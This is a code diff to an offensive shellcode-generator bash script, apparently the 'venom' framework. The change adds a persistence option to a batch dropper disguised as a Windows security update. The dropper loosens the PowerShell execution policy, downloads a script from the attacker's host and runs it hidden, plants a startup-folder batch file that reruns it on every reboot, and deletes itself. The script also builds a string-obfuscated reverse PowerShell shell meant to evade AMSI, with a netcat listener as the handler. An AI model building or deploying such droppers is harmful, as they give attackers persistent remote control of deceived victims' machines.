@@ -12047,7 +12047,7 @@ echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
 echo "#>" >> $IPATH/output/$Drop.ps1
 echo "" >> $IPATH/output/$Drop.ps1
 echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$Drop.ps1
+echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:computername System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
 echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
 echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
 echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
@@ -12186,6 +12186,8 @@ if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
+## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
+random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
@@ -12203,14 +12205,35 @@ echo "---"
 
 ## BUILD DROPPER
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
-# echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-echo "@echo off" > $IPATH/output/$Drop.bat
-echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
-echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
-echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+
+if [ "$persistence" = "Dont Add Persistence" ]; then
+   echo "@echo off" > $IPATH/output/$Drop.bat
+   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
+   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
+else
+   ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
+   echo "@echo off" > $IPATH/output/$Drop.bat
+   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
+   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
+   ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
+   echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+   ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
+   echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
+fi
 
 
 ## Build Reverse Powershell Shell
@@ -12221,7 +12244,6 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();" >> $IPATH/output/$NaM.ps1
 echo "[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12309,6 +12331,21 @@ rm $IPATH/output/key.pem > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
+
+## Remark related to 'persistence' function..
+if [ "$persistence" = "Add persistence)" ]; then
+   ## Write how to delete persistence to output folder ..
+   echo "LHOST: $lhost" > $IPATH/output/delete_persistence.txt
+   echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence.txt
+   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence.txt
+   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence.txt
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence.txt
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence.txt" --info > /dev/null 2>&1
+fi
 sh_menu
 }
 
@@ -12404,7 +12441,7 @@ else
    ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
    echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo echo Connecting to Remote Server To Download Updates .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
